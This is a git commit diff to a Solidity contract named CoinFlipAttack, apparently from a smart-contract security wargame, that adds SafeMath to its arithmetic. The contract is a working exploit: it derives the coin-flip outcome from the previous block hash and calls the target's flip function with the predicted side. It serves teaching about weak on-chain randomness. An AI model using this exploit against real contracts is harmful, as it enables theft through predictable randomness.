10451411ef350be86cb4b4f0286eb1b021eafe4b
Paulina Blaszkiewicz <paulina.blaszk@gmail.com>
2019-04-30 13:41:42 +0200

    Use SafeMath for arithmetic operations

--- contracts/attacks/CoinFlipAttack.sol
+++ contracts/attacks/CoinFlipAttack.sol
@@ -1,14 +1,17 @@
 pragma solidity ^0.4.18;
 
 import '../levels/CoinFlip.sol';
+import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
 
 contract CoinFlipAttack {
+
+  using SafeMath for uint256;
   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
   function attack(address _victim) public returns (bool) {
     CoinFlip coinflip = CoinFlip(_victim);
-    uint256 blockValue = uint256(block.blockhash(block.number-1));
-    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));
+    uint256 coinFlip = uint256(uint256(blockValue).div(FACTOR));
     bool side = coinFlip == 1 ? true : false;
     coinflip.flip(side);
     return side;
